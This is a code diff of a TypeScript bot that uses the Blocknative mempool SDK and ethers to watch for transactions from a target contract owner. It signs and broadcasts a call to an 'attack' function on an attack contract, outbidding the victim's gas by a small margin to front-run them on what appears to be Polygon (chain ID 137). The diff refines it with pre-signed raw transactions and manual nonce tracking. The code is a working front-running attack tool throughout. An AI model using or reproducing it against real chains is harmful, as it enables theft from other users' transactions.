@@ -1,9 +1,8 @@
 import * as ethers from "ethers";
 import BlocknativeSdk from "bnc-sdk";
 import { EthereumTransactionData, TransactionEvent } from "bnc-sdk";
-// import Web3 from "web3";
-const WebSocket = require("ws");
 
+const WebSocket = require("ws");
 require("dotenv").config();
 
 const listenContractAddress = process.env.LISTEN_CONTRACT_ADDRESS!;
@@ -25,7 +24,19 @@ const abi = [
   },
 ];
 
-const eventHandler = (event: TransactionEvent) => {
+const attackerWallet = new ethers.Wallet(attackPrivateKey, provider);
+const attackContract = new ethers.Contract(
+  attackContractAddress,
+  abi,
+  attackerWallet
+);
+const gasPriceToAdd = 1;
+let nonce = -1;
+attackerWallet.getNonce().then((n) => {
+  nonce = n;
+  console.log("Got nonce:", nonce);
+});
+const eventHandler = async (event: TransactionEvent) => {
   const tx = event.transaction as EthereumTransactionData;
   console.log("Receive tx event:", JSON.stringify(tx, null, 2));
   if (tx.from.toLowerCase() != listenContractOwnerAddress.toLowerCase()) {
@@ -41,34 +52,45 @@ const eventHandler = (event: TransactionEvent) => {
   if (tx.maxPriorityFeePerGasGwei) {
     const priorityFee = tx.maxPriorityFeePerGasGwei;
     console.log("got tx priorityFee gwei:", priorityFee);
-    const newPriorityFeeWei = (priorityFee + 50) * 1e9;
+    const newPriorityFeeWei = (priorityFee + gasPriceToAdd) * 1e9;
     gasSetting["maxPriorityFeePerGas"] = "0x" + newPriorityFeeWei.toString(16);
 
     const maxFee = tx.maxFeePerGasGwei!;
     console.log("got tx maxFee gwei:", maxFee);
-    const newMaxFeeWei = (maxFee + 50) * 1e9;
+    const newMaxFeeWei = (maxFee + gasPriceToAdd) * 1e9;
     gasSetting["maxFeePerGas"] = "0x" + newMaxFeeWei.toString(16);
   } else if (tx.gasPriceGwei) {
     const gasPrice = tx.gasPriceGwei!;
     console.log("got tx gasPrice gwei:", gasPrice);
-    const newGasPriceWei = (gasPrice + 50) * 1e9;
+    const newGasPriceWei = (gasPrice + gasPriceToAdd) * 1e9;
     gasSetting["gasPrice"] = "0x" + newGasPriceWei.toString(16);
   } else {
     console.error("Unknown tx type!", tx);
     return;
   }
-  console.log("Sending gasSetting:", gasSetting);
-
-  const wallet = new ethers.Wallet(attackPrivateKey, provider);
-  const contract = new ethers.Contract(attackContractAddress, abi, wallet);
-  const txResponse = contract.attack(gasSetting);
-  console.log("Attacking...");
-  txResponse
+  console.log("Sending with gasSetting:", gasSetting);
+  const rawTx = await attackerWallet.signTransaction({
+    to: attackContractAddress,
+    data: attackContract.interface.encodeFunctionData("attack", []),
+    gasLimit: 300000,
+    nonce: nonce,
+    chainId: 137,
+    ...gasSetting,
+  });
+  console.log("Signed tx:", rawTx);
+  provider
+    .broadcastTransaction(rawTx)
     .then((tx) => {
-      console.log("txResponse:", tx);
-      console.log("txResponse.hash:", tx.hash);
+      console.log("tx response hash:", tx.hash);
+      return provider.waitForTransaction(tx.hash);
+    })
+    .then((receipt) => {
+      console.log("tx receipt:", receipt);
     })
     .catch((err) => console.log(err));
+
+  nonce += 1;
+  console.log("Current nonce:", nonce);
 };
 
 const sdk = new BlocknativeSdk({
